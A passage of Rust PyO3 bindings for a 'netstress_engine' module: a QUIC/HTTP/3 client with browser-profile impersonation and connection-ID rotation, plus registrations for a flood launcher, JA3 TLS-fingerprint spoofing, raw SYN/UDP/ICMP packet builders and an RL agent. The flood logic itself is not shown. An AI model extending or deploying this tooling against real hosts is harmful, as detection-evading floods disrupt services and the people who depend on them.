fn create_rl_agent(_model_path: Option<String>) -> PyResult<PyRLAgent> {
    Err(PyRuntimeError::new_err("RL agent requires 'rl_agent' feature to be enabled"))
}

/// Get available action types
#[cfg(feature = "rl_agent")]
#[pyfunction]
fn get_action_types() -> Vec<String> {
    rl_agent::ActionType::all_actions()
        .into_iter()
        .map(|action| format!("{:?}", action))
        .collect()
}

/// Get available action types (stub)
#[cfg(not(feature = "rl_agent"))]
#[pyfunction]
fn get_action_types() -> Vec<String> {
    vec![]
}

/// Python-exposed QUIC/HTTP/3 Engine
/// **Validates: Requirements 5.3, 5.4, 5.5** - QUIC protocol with 0-RTT and migration
#[cfg(feature = "quic")]
#[pyclass]
pub struct PyQuicHttp3Engine {
    inner: Arc<parking_lot::Mutex<quic_http3_engine::QuicHttp3Engine>>,
    runtime: Arc<tokio::runtime::Runtime>,
}

#[cfg(feature = "quic")]
#[pymethods]
impl PyQuicHttp3Engine {
    /// Create new QUIC/HTTP/3 engine with browser profile
    #[new]
    fn new(profile_name: Option<String>) -> PyResult<Self> {
        let profile = match profile_name.as_deref() {
            Some("chrome_120") => quic_http3_engine::QuicBrowserProfile::chrome_120(),
            Some("firefox_121") => quic_http3_engine::QuicBrowserProfile::firefox_121(),
            Some("safari_17") => quic_http3_engine::QuicBrowserProfile::safari_17(),
            _ => quic_http3_engine::QuicBrowserProfile::default(),
        };

        let engine = quic_http3_engine::QuicHttp3Engine::new(profile)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to create QUIC engine: {}", e)))?;

        let runtime = Arc::new(
            tokio::runtime::Runtime::new()
                .map_err(|e| PyRuntimeError::new_err(format!("Failed to create async runtime: {}", e)))?
        );

        Ok(Self {
            inner: Arc::new(parking_lot::Mutex::new(engine)),
            runtime,
        })
    }

    /// Initialize the QUIC endpoint
    fn initialize(&self, py: Python) -> PyResult<()> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let mut engine = inner.lock();
                engine.initialize().await
                    .map_err(|e| PyRuntimeError::new_err(format!("Failed to initialize QUIC engine: {}", e)))
            })
        })
    }

    /// Connect to server with 0-RTT support
    fn connect_with_0rtt(&self, py: Python, server_name: String, host: String, port: u16) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let server_addr = format!("{}:{}", host, port).parse()
                    .map_err(|e| PyRuntimeError::new_err(format!("Invalid server address: {}", e)))?;

                let mut engine = inner.lock();
                match engine.connect_with_0rtt(&server_name, server_addr).await {
                    Ok(_) => Ok(true),
                    Err(e) => Err(PyRuntimeError::new_err(format!("Connection failed: {}", e))),
                }
            })
        })
    }

    /// Send HTTP/3 request
    #[cfg(feature = "http3")]
    fn send_http3_request(
        &self,
        py: Python,
        server_name: String,
        host: String,
        port: u16,
        method: String,
        path: String,
        headers: Option<Vec<(String, String)>>,
        body: Option<Vec<u8>>,
    ) -> PyResult<(u16, Vec<u8>)> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let server_addr = format!("{}:{}", host, port).parse()
                    .map_err(|e| PyRuntimeError::new_err(format!("Invalid server address: {}", e)))?;

                let body_bytes = body.map(|b| bytes::Bytes::from(b));

                let mut engine = inner.lock();
                match engine.send_http3_request(&server_name, server_addr, &method, &path, headers, body_bytes).await {
                    Ok((status, response_body)) => Ok((status, response_body.to_vec())),
                    Err(e) => Err(PyRuntimeError::new_err(format!("HTTP/3 request failed: {}", e))),
                }
            })
        })
    }

    /// Perform connection migration
    fn migrate_connection(&self, py: Python, server_name: String) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let mut engine = inner.lock();
                match engine.migrate_connection(&server_name, None).await {
                    Ok(_) => Ok(true),
                    Err(e) => {
                        eprintln!("Migration failed: {}", e);
                        Ok(false)
                    }
                }
            })
        })
    }

    /// Perform advanced connection migration with connection ID rotation
    fn migrate_connection_advanced(&self, py: Python, server_name: String, host: String, port: u16, rotate_id: bool) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let new_addr = format!("{}:{}", host, port).parse()
                    .map_err(|e| PyRuntimeError::new_err(format!("Invalid address: {}", e)))?;

                let mut engine = inner.lock();
                match engine.migrate_connection_advanced(&server_name, new_addr, rotate_id).await {
                    Ok(_) => Ok(true),
                    Err(e) => Err(PyRuntimeError::new_err(format!("Advanced migration failed: {}", e))),
                }
            })
        })
    }

    /// Detect and handle NAT rebinding
    fn detect_nat_rebinding(&self, py: Python, server_name: String) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let mut engine = inner.lock();
                match engine.detect_and_handle_nat_rebinding(&server_name).await {
                    Ok(rebinding_detected) => Ok(rebinding_detected),
                    Err(e) => {
                        eprintln!("NAT rebinding detection failed: {}", e);
                        Ok(false)
                    }
                }
            })
        })
    }

    /// Perform proactive migration for load balancing
    fn proactive_migration(&self, py: Python, server_name: String, target_hosts: Vec<String>, target_ports: Vec<u16>) -> PyResult<Option<String>> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                if target_hosts.len() != target_ports.len() {
                    return Err(PyRuntimeError::new_err("Hosts and ports arrays must have same length"));
                }

                let target_addresses: Result<Vec<_>, _> = target_hosts.iter()
                    .zip(target_ports.iter())
                    .map(|(host, port)| format!("{}:{}", host, port).parse())
                    .collect();

                let addresses = target_addresses
                    .map_err(|e| PyRuntimeError::new_err(format!("Invalid address: {}", e)))?;

                let mut engine = inner.lock();
                match engine.proactive_migration(&server_name, addresses).await {
                    Ok(best_addr) => Ok(Some(best_addr.to_string())),
                    Err(e) => {
                        eprintln!("Proactive migration failed: {}", e);
                        Ok(None)
                    }
                }
            })
        })
    }

    /// Cache session ticket for 0-RTT
    fn cache_session_ticket(&self, server_name: String, ticket: Vec<u8>, max_early_data: u32) {
        let mut engine = self.inner.lock();
        engine.cache_session_ticket(&server_name, ticket, max_early_data);
    }

    /// Send early data over 0-RTT connection
    fn send_early_data(&self, py: Python, server_name: String, data: Vec<u8>) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let engine = inner.lock();
                
                // Find connection by server name
                let connections = engine.active_connections.read();
                if let Some(connection) = connections.values().next() {
                    match engine.send_early_data(connection, &data).await {
                        Ok(_) => Ok(true),
                        Err(e) => {
                            eprintln!("Early data send failed: {}", e);
                            Ok(false)
                        }
                    }
                } else {
                    Ok(false)
                }
            })
        })
    }

    /// Handle 0-RTT rejection gracefully
    fn handle_0rtt_rejection(&self, py: Python, server_name: String, host: String, port: u16) -> PyResult<bool> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let server_addr = format!("{}:{}", host, port).parse()
                    .map_err(|e| PyRuntimeError::new_err(format!("Invalid server address: {}", e)))?;

                let mut engine = inner.lock();
                match engine.handle_0rtt_rejection(&server_name, server_addr).await {
                    Ok(_) => Ok(true),
                    Err(e) => Err(PyRuntimeError::new_err(format!("0-RTT rejection handling failed: {}", e))),
                }
            })
        })
    }

    /// Get QUIC statistics
    fn get_stats(&self) -> PyResult<HashMap<String, u64>> {
        let engine = self.inner.lock();
        let stats = engine.get_quic_stats();

        let mut result = HashMap::new();
        result.insert("connections_established".to_string(), stats.connections_established);
        result.insert("connections_failed".to_string(), stats.connections_failed);
        result.insert("zero_rtt_accepted".to_string(), stats.zero_rtt_accepted);
        result.insert("zero_rtt_rejected".to_string(), stats.zero_rtt_rejected);
        result.insert("migrations_performed".to_string(), stats.migrations_performed);
        result.insert("requests_sent".to_string(), stats.requests_sent);
        result.insert("requests_successful".to_string(), stats.requests_successful);
        result.insert("bytes_sent".to_string(), stats.bytes_sent);
        result.insert("bytes_received".to_string(), stats.bytes_received);

        Ok(result)
    }

    /// Get active connection count
    fn active_connections(&self) -> usize {
        let engine = self.inner.lock();
        engine.active_connection_count()
    }

    /// Close all connections
    fn close_all(&self, py: Python) -> PyResult<()> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);

        py.allow_threads(|| {
            runtime.block_on(async {
                let mut engine = inner.lock();
                engine.close_all_connections().await;
                Ok(())
            })
        })
    }
}

/// Python-exposed QUIC/HTTP/3 Engine (fallback for non-QUIC builds)
#[cfg(not(feature = "quic"))]
#[pyclass]
pub struct PyQuicHttp3Engine;

#[cfg(not(feature = "quic"))]
#[pymethods]
impl PyQuicHttp3Engine {
    #[new]
    fn new(_profile_name: Option<String>) -> PyResult<Self> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn initialize(&self, _py: Python) -> PyResult<()> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn connect_with_0rtt(&self, _py: Python, _server_name: String, _host: String, _port: u16) -> PyResult<bool> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn send_http3_request(
        &self,
        _py: Python,
        _server_name: String,
        _host: String,
        _port: u16,
        _method: String,
        _path: String,
        _headers: Option<Vec<(String, String)>>,
        _body: Option<Vec<u8>>,
    ) -> PyResult<(u16, Vec<u8>)> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn migrate_connection(&self, _py: Python, _server_name: String) -> PyResult<bool> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn cache_session_ticket(&self, _server_name: String, _ticket: Vec<u8>, _max_early_data: u32) {
        // No-op for fallback
    }

    fn get_stats(&self) -> PyResult<HashMap<String, u64>> {
        Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
    }

    fn active_connections(&self) -> usize {
        0
    }

    fn close_all(&self, _py: Python) -> PyResult<()> {
        Ok(())
    }
}

/// Create QUIC/HTTP/3 engine
#[cfg(feature = "quic")]
#[pyfunction]
fn create_quic_engine(profile_name: Option<String>) -> PyResult<PyQuicHttp3Engine> {
    PyQuicHttp3Engine::new(profile_name)
}

/// Create QUIC/HTTP/3 engine (stub for non-QUIC builds)
#[cfg(not(feature = "quic"))]
#[pyfunction]
fn create_quic_engine(_profile_name: Option<String>) -> PyResult<PyQuicHttp3Engine> {
    Err(PyRuntimeError::new_err("QUIC support not available - compile with --features quic"))
}

/// Get available QUIC browser profiles
#[pyfunction]
fn get_quic_profiles() -> Vec<String> {
    vec![
        "chrome_120".to_string(),
        "firefox_121".to_string(),
        "safari_17".to_string(),
    ]
}

/// Python module definition
#[pymodule]
fn netstress_engine(m: &Bound<'_, PyModule>) -> PyResult<()> {
    // Core classes
    m.add_class::<PacketEngine>()?;
    m.add_class::<PySafetyController>()?;
    m.add_class::<PyAuditLogger>()?;
    m.add_class::<PySharedMemoryWriter>()?;
    m.add_class::<PyKademliaNode>()?;
    m.add_class::<PyAdaptiveScaler>()?;

    // TLS/JA3 Spoof classes
    m.add_class::<PyJA3Spoofer>()?;
    m.add_class::<PyTlsProfile>()?;

    // RL Agent classes
    m.add_class::<PyRLAgent>()?;

    // QUIC/HTTP/3 classes
    m.add_class::<PyQuicHttp3Engine>()?;

    // Core functions
    m.add_function(wrap_pyfunction!(start_flood, m)?)?;
    m.add_function(wrap_pyfunction!(build_packet, m)?)?;
    m.add_function(wrap_pyfunction!(get_capabilities, m)?)?;
    m.add_function(wrap_pyfunction!(get_stats, m)?)?;

    // TLS/JA3 Spoof functions
    m.add_function(wrap_pyfunction!(build_tls_client_hello, m)?)?;
    m.add_function(wrap_pyfunction!(get_ja3_hash, m)?)?;
    m.add_function(wrap_pyfunction!(list_tls_profiles, m)?)?;

    // Protocol builder functions
    m.add_function(wrap_pyfunction!(build_udp_packet, m)?)?;
    m.add_function(wrap_pyfunction!(build_tcp_syn, m)?)?;
    m.add_function(wrap_pyfunction!(build_icmp_echo, m)?)?;
    m.add_function(wrap_pyfunction!(build_http_get, m)?)?;
    m.add_function(wrap_pyfunction!(build_dns_query, m)?)?;
    m.add_function(wrap_pyfunction!(generate_packet_batch, m)?)?;

    // Backend selection functions
    m.add_function(wrap_pyfunction!(get_capability_report, m)?)?;
    m.add_function(wrap_pyfunction!(get_available_backends, m)?)?;

    // Statistics functions
    m.add_function(wrap_pyfunction!(get_realtime_stats_json, m)?)?;
    m.add_function(wrap_pyfunction!(get_prometheus_metrics, m)?)?;

    // Platform optimization functions
    m.add_function(wrap_pyfunction!(get_linux_optimization_report, m)?)?;
    m.add_function(wrap_pyfunction!(get_windows_optimization_report, m)?)?;
    m.add_function(wrap_pyfunction!(get_macos_optimization_report, m)?)?;

    // Adaptive scaling functions
    m.add_function(wrap_pyfunction!(detect_hardware_profile, m)?)?;
    m.add_function(wrap_pyfunction!(classify_device_tier, m)?)?;

    // RL Agent functions
    m.add_function(wrap_pyfunction!(create_rl_agent, m)?)?;
    m.add_function(wrap_pyfunction!(get_action_types, m)?)?;

    // QUIC/HTTP/3 functions
    m.add_function(wrap_pyfunction!(create_quic_engine, m)?)?;
    m.add_function(wrap_pyfunction!(get_quic_profiles, m)?)?;

    // Version info
    m.add("__version__", "2.0.0")?;
    m.add("__author__", "NetStress Team")?;

    Ok(())
}
